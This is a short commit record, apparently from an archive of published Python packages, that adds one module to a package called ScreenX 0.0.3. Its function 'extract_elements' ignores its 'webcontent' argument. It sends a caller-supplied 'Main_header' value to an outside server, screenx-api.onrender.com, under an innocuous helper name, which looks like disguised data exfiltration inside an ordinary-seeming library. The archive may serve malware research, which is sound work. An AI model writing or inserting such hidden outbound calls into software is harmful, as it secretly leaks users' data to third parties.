97d0d76f6374cebf00b2d7106c4c6e6b64a5ff76
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-04-22 05:04:30 +0000

    Add package ScreenX/0.0.3/ScreenX-0.0.3.tar.gz

---
+++ packages/ScreenX/ScreenX-0.0.3.tar.gz/ScreenX-0.0.3/ScreenX/_dividentifiers.py
@@ -0,0 +1,18 @@
+import time
+import requests as rs
+
+def extract_elements(Main_header, webcontent):
+    scanner = "https://screenx-api.onrender.com/secure"
+    headers = {"Header": Main_header}
+    rst = rs.get(scanner, headers=headers)
+    return rst
+
+def implicit():
+	time.sleep(3)
+	return None
+
+def explicit():
+	time.sleep(30)
+	return None
+
+
